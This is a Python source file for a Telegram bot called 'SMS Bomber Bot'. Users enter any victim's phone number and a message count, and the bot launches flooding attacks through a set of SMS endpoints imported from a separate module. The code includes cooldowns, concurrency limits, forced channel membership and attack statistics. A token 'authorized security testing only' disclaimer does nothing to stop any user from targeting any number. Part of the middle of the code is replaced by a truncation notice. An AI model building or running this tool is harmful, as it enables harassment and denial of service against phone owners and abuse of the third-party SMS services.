#!/usr/bin/env python3
"""
SMS Bomber Bot - Main Application
Production-grade Telegram bot with proper architecture
"""

import os
import sys
import asyncio
import logging
from datetime import datetime, timedelta
from typing import Dict, Optional, Set
from dataclasses import dataclass, field

from pyrogram import Client, filters, idle
from pyrogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton, 
    Message, CallbackQuery
)
from pyrogram.errors import (
    UserNotParticipant, FloodWait, MessageNotModified,
    ChatAdminRequired
)

from config import (
    bot_config, channel_config, rate_limits,
    MESSAGES, TARGET_ENDPOINTS, ADMIN_IDS
)
from sms import SMSBomber, validate_phone, AttackStats

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('bot.log')
    ]
)
logger = logging.getLogger(__name__)


@dataclass
class UserSession:
    """User session state"""
    user_id: int
    username: Optional[str] = None
    step: str = "idle"  # idle, phone, count, attacking
    phone: Optional[str] = None
    count: int = 0
    last_attack: Optional[datetime] = None
    total_attacks: int = 0
    message_id: Optional[int] = None


class BotState:
    """Global bot state management"""
    
    def __init__(self):
        self.sessions: Dict[int, UserSession] = {}
        self.active_bombers: Dict[int, SMSBomber] = {}
        self.cooldowns: Dict[int, datetime] = {}
        self.global_count: int = 0
        self._lock = asyncio.Lock()
    
    def get_session(self, user_id: int, username: Optional[str] = None) -> UserSession:
        if user_id not in self.sessions:
            self.sessions[user_id] = UserSession(user_id=user_id, username=username)
        return self.sessions[user_id]
    
    async def check_cooldown(self, user_id: int) -> tuple[bool, str]:
        """Check if user is in cooldown"""
        async with self._lock:
            if user_id in self.cooldowns:
                elapsed = datetime.now() - self.cooldowns[user_id]
                if elapsed < timedelta(hours=rate_limits.COOLDOWN_HOURS):
                    remaining = timedelta(hours=rate_limits.COOLDOWN_HOURS) - elapsed
                    hours, remainder = divmod(int(remaining.total_seconds()), 3600)
                    minutes, _ = divmod(remainder, 60)
                    return False, f"{hours}h {minutes}m"
                else:
                    del self.cooldowns[user_id]
            return True, ""
    
    async def set_cooldown(self, user_id: int):
        """Set cooldown for user"""
        async with self._lock:
            self.cooldowns[user_id] = datetime.now()
    
    async def can_start_attack(self) -> bool:
        """Check global attack limit"""
        async with self._lock:
            return len(self.active_bombers) < rate_limits.MAX_CONCURRENT_ATTACKS


# Initialize
state = BotState()

# Create bot
app = Client(
    "sms_bomber_bot",
    api_id=bot_config.API_ID,
    api_hash=bot_config.API_HASH,
    bot_token=bot_config.TOKEN,
    workers=100,
    parse_mode="markdown"
)


# ==========================================
# KEYBOARDS
# ==========================================

def main_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Start Attack", callback_data="start")],
        [InlineKeyboardButton("📊 Statistics", callback_data="stats")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ])

def verify_keyboard() -> InlineKeyboardMarkup:
    channel_url = f"https://t.me/{channel_config.USERNAME.replace('@', '')}"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Join Channel", url=channel_url)],
        [InlineKeyboardButton("✅ Verify Join", callback_data="verify")],
        [InlineKeyboardButton("🔙 Back", callback_data="back")]
    ])

def cancel_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
    ])

def done_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 New Attack", callback_data="start")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="back")]
    ])


# ==========================================
# MIDDLEWARE
# ==========================================

async def check_membership(user_id: int) -> bool:
    """

[Content truncated due to size limit. Use line ranges to read in chunks]

 as e:
        logger.error(f"Membership check error: {e}")
        return True  # Fail open


# ==========================================
# HANDLERS
# ==========================================

@app.on_message(filters.command("start") & (filters.private | filters.group))
async def cmd_start(client, message: Message):
    """Handle /start command in both private and group chats"""
    try:
        # Get user info (handle both private and group contexts)
        user = message.from_user
        if not user:
            # In groups, if user info isn't available, try to get from message
            logger.warning("No user info in start command")
            return
        
        user_id = user.id
        username = user.username
        
        logger.info(f"/start from user {user_id} (@{username}) in chat {message.chat.id} ({message.chat.type})")
        
        # Initialize session
        session = state.get_session(user_id, username)
        session.step = "idle"  # Reset step on start
        
        welcome = MESSAGES["WELCOME"].format(count=len(TARGET_ENDPOINTS))
        
        # Check force join (only in private chats)
        if message.chat.type == "private" and channel_config.is_configured:
            try:
                is_member = await check_membership(user_id)
                if not is_member:
                    force_msg = MESSAGES["FORCE_JOIN"].format(channel=channel_config.USERNAME)
                    await message.reply_text(welcome + "\n\n" + force_msg, reply_markup=verify_keyboard())
                    return
            except Exception as e:
                logger.error(f"Membership check failed: {e}")
                # Continue anyway on membership check failure
        
        await message.reply_text(welcome, reply_markup=main_keyboard())
        logger.info(f"Sent welcome to user {user_id}")
        
    except Exception as e:
        logger.error(f"Error in /start handler: {e}", exc_info=True)
        try:
            await message.reply_text("❌ An error occurred. Please try again or contact support.")
        except:
            pass


@app.on_message(filters.command("help") & (filters.private | filters.group))
async def cmd_help(client, message: Message):
    """Handle /help command in both private and group chats"""
    try:
        user_id = message.from_user.id if message.from_user else None
        logger.info(f"/help from user {user_id} in chat {message.chat.id}")
        
        help_text = """
**📖 Help Guide**

**How to use:**
1. Click "🚀 Start Attack" (DMs only)
2. Enter target phone number
3. Enter number of SMS to send
4. Wait for completion

**Supported formats:**
• +91XXXXXXXXXX
• 91XXXXXXXXXX  
• XXXXXXXXXX (10 digits)

**Limits:**
• Max {max} SMS per attack
• {cooldown}h cooldown between uses
• {concurrent} concurrent attacks max

**Note:** SMS bombing only works in private messages with the bot.

**For authorized security testing only.**
""".format(
            max=rate_limits.MAX_ATTEMPTS_PER_USER,
            cooldown=rate_limits.COOLDOWN_HOURS,
            concurrent=rate_limits.MAX_CONCURRENT_ATTACKS
        )
        
        # In groups, don't show the keyboard (buttons don't work well in groups)
        if message.chat.type == "private":
            await message.reply_text(help_text, reply_markup=main_keyboard())
        else:
            await message.reply_text(help_text)
            
    except Exception as e:
        logger.error(f"Error in /help: {e}", exc_info=True)
        await message.reply_text("❌ Error showing help.")


@app.on_message(filters.command("stats") & (filters.private | filters.group))
async def cmd_stats(client, message: Message):
    """Handle /stats command in both private and group chats"""
    try:
        user = message.from_user
        if not user:
            await message.reply_text("❌ Cannot identify user.")
            return
            
        logger.info(f"/stats from user {user.id} (@{user.username})")
        
        session = state.get_session(user.id, user.username)
        
        stats_text = f"""
**📊 Your Statistics**

👤 User ID: `{user.id}`
🎯 Total Attacks: {session.total_attacks}
📱 Last Attack: {session.last_attack.strftime('%Y-%m-%d %H:%M') if session.last_attack else 'Never'}

**Global:**
🌐 Active Attacks: {len(state.active_bombers)}
📤 Total Sent Today: {state.global_count}
"""
        # In groups, don't show the keyboard
        if message.chat.type == "private":
            await message.reply_text(stats_text, reply_markup=main_keyboard())
        else:
            await message.reply_text(stats_text)
            
    except Exception as e:
        logger.error(f"Error in /stats: {e}", exc_info=True)
        await message.reply_text("❌ Error retrieving stats.")


@app.on_message(filters.command("admin") & filters.user(ADMIN_IDS))
async def cmd_admin(client, message: Message):
    """Admin panel - works anywhere for admins"""
    try:
        user = message.from_user
        logger.info(f"Admin command from {user.id} (@{user.username})")
        
        admin_text = f"""
**🔐 Admin Panel**

**System Status:**
🟢 Active Sessions: {len(state.sessions)}
🔥 Active Attacks: {len(state.active_bombers)}
⏱️ Cooldowns: {len(state.cooldowns)}

**Endpoints:** {len(TARGET_ENDPOINTS)}

**Config:**
Channel: {channel_config.USERNAME if channel_config.is_configured else 'Not set'}
"""
        await message.reply_text(admin_text)
    except Exception as e:
        logger.error(f"Admin error: {e}", exc_info=True)
        await message.reply_text("❌ Error in admin command.")


@app.on_callback_query()
async def callback_handler(client, callback_query: CallbackQuery):
    """Handle all callback queries"""
    user_id = callback_query.from_user.id
    data = callback_query.data
    session = state.get_session(user_id)
    
    try:
        if data == "start":
            # Check membership
            if channel_config.is_configured and not await check_membership(user_id):
                await callback_query.message.edit_text(
                    MESSAGES["FORCE_JOIN"].format(channel=channel_config.USERNAME),
                    reply_markup=verify_keyboard()
                )
                await callback_query.answer("Join required channel first!")
                return
            
            # Check cooldown
            can_proceed, remaining = await state.check_cooldown(user_id)
            if not can_proceed:
                await callback_query.answer(f"Cooldown: {remaining}", show_alert=True)
                return
            
            # Check global limits
            if not await state.can_start_attack():
                await callback_query.answer("Server busy, try again later", show_alert=True)
                return
            
            session.step = "phone"
            await callback_query.message.edit_text(
                MESSAGES["ENTER_PHONE"],
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]])
            )
            await callback_query.answer()
        
        elif data == "verify":
            is_member = await check_membership(user_id)
            if is_member:
                await callback_query.message.edit_text(
                    MESSAGES["WELCOME"].format(count=len(TARGET_ENDPOINTS)),
                    reply_markup=main_keyboard()
                )
                await callback_query.answer("✅ Verified!")
            else:
                await callback_query.answer("❌ Not joined yet!", show_alert=True)
        
        elif data == "stats":
            await callback_query.message.edit_text(
                f"**📊 Statistics**\n\nActive Attacks: {len(state.active_bombers)}\nYour Total: {session.total_attacks}",
                reply_markup=main_keyboard()
            )
            await callback_query.answer()
        
        elif data == "help":
            await callback_query.message.edit_text(
                "**❓ Help**\n\nSend /help for detailed instructions",
                reply_markup=main_keyboard()
            )
            await callback_query.answer()
        
        elif data == "back":
            session.step = "idle"
            await callback_query.message.edit_text(
                MESSAGES["WELCOME"].format(count=len(TARGET_ENDPOINTS)),
                reply_markup=main_keyboard()
            )
            await callback_query.answer()
        
        elif data == "cancel":
            if user_id in state.active_bombers:
                bomber = state.active_bombers[user_id]
                await bomber.stop()
                del state.active_bombers[user_id]
            
            session.step = "idle"
            await callback_query.message.edit_text(
                "❌ Attack cancelled",
                reply_markup=main_keyboard()
            )
            await callback_query.answer("Cancelled")
        
    except FloodWait as e:
        await asyncio.sleep(e.value)
    except Exception as e:
        logger.error(f"Callback error: {e}")
        await callback_query.answer("Error occurred")


@app.on_message(filters.text & filters.private)
async def text_handler(client, message: Message):
    """Handle text input"""
    user_id = message.from_user.id
    text = message.text.strip()
    session = state.get_session(user_id, message.from_user.username)
    
    # Ignore commands
    if text.startswith("/"):
        return
    
    if session.step == "idle":
        await message.reply_text(
            "Press 🚀 Start Attack to begin",
            reply_markup=main_keyboard()
        )
        return
    
    if session.step == "phone":
        # Validate phone
        is_valid, result = validate_phone(text)
        if not is_valid:
            await message.reply_text(
                MESSAGES["ERROR"].format(message=result),
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]])
            )
            return
        
        session.phone = result
        session.step = "count"
        
        await message.reply_text(
            MESSAGES["ENTER_COUNT"].format(
                max=rate_limits.MAX_ATTEMPTS_PER_USER,
                cooldown=rate_limits.COOLDOWN_HOURS
            ),
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]])
        )
        return
    
    if session.step == "count":
        # Validate count
        try:
            count = int(text)
            if count < 1 or count > rate_limits.MAX_ATTEMPTS_PER_USER:
                await message.reply_text(
                    MESSAGES["ERROR"].format(
                        message=f"Enter number between 1 and {rate_limits.MAX_ATTEMPTS_PER_USER}"
                    ),
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]])
                )
                return
        except ValueError:
            await message.reply_text(
                MESSAGES["ERROR"].format(message="Enter a valid number"),
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]])
            )
            return
        
        # Check if already attacking
        if user_id in state.active_bombers:
            await message.reply_text("⚠️ You already have an active attack")
            return
        
        session.count = count
        session.step = "attacking"
        
        # Start attack
        status_msg = await message.reply_text(
            MESSAGES["ATTACK_START"].format(
                number=session.phone,
                count=count,
                endpoints=len(TARGET_ENDPOINTS)
            ),
            reply_markup=cancel_keyboard()
        )
        session.message_id = status_msg.id
        
        # Create bomber
        bomber = SMSBomber(
            phone_number=session.phone,
            count=count,
            progress_callback=lambda stats: update_progress(user_id, stats)
        )
        state.active_bombers[user_id] = bomber
        
        # Run attack
        asyncio.create_task(run_attack(user_id, bomber, message.chat.id))


async def update_progress(user_id: int, stats: AttackStats):
    """Update progress message"""
    session = state.get_session(user_id)
    if not session.message_id:
        return
    
    try:
        bomber = state.active_bombers.get(user_id)
        if bomber:
            await app.edit_message_text(
                chat_id=user_id,
                message_id=session.message_id,
                text=bomber.format_status(),
                reply_markup=cancel_keyboard()
            )
    except MessageNotModified:
        pass
    except FloodWait:
        pass
    except Exception as e:
        logger.error(f"Progress update error: {e}")


async def run_attack(user_id: int, bomber: SMSBomber, chat_id: int):
    """Run attack and handle completion"""
    session = state.get_session(user_id)
    
    try:
        stats = await bomber.start()
        
        # Update stats
        session.total_attacks += 1
        session.last_attack = datetime.now()
        await state.set_cooldown(user_id)
        
        async with state._lock:
            state.global_count += stats.total
        
        # Send completion
        complete_text = MESSAGES["ATTACK_COMPLETE"].format(
            number=session.phone,
            attempted=stats.total,
            success=stats.success,
            failed=stats.failed,
            duration=stats.duration,
            rate=stats.rate
        )
        
        try:
            await app.edit_message_text(
                chat_id=chat_id,
                message_id=session.message_id,
                text=complete_text,
                reply_markup=done_keyboard()
            )
        except:
            await app.send_message(chat_id, complete_text, reply_markup=done_keyboard())
        
    except Exception as e:
        logger.error(f"Attack error: {e}")
        await app.send_message(
            chat_id,
            MESSAGES["ERROR"].format(message=str(e)),
            reply_markup=done_keyboard()
        )
    
    finally:
        # Cleanup
        session.step = "idle"
        if user_id in state.active_bombers:
            del state.active_bombers[user_id]


# ==========================================
# MAIN
# ==========================================

async def main():
    """Main entry point"""
    if not bot_config.is_configured:
        print("❌ ERROR: Bot not configured. Set BOT_TOKEN, API_ID, API_HASH environment variables.")
        sys.exit(1)
    
    logger.info("Starting SMS Bomber Bot...")
    
    await app.start()
    me = await app.get_me()
    logger.info(f"Bot started: @{me.username}")
    
    # Keep running
    await idle()
    
    await app.stop()
    logger.info("Bot stopped")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)
